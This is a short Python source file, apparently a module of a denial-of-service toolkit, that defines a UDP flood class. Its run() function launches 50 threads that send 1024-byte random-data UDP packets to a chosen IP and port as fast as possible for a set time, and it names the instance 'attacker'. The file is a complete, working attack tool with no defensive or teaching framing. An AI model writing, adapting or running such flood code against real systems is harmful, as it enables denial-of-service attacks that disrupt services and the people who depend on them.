import socket
import threading
import os
import time

class UDPPPS:
    def __init__(self, ip, port, threads, stop_event=None):
        self.ip = ip
        self.port = port
        self.packet_size = 1024
        self.threads = threads
        self.stop_event = stop_event
        self.on = False

    def flood(self, duration):
        self.on = True
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.send, daemon=True)
            t.start()
            threads.append(t)

        end_time = time.time() + duration
        try:
            while time.time() < end_time and self.on:
                if self.stop_event and self.stop_event.is_set():
                    break
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        finally:
            self.on = False

    def send(self):
        while self.on:
            if self.stop_event and self.stop_event.is_set():
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = os.urandom(self.packet_size)
                s.sendto(data, (self.ip, self.port))
                s.close()
            except Exception:
                pass

def run(ip, port, duration, stop_event):
    attacker = UDPPPS(ip, port, threads=50, stop_event=stop_event)
    attacker.flood(duration)
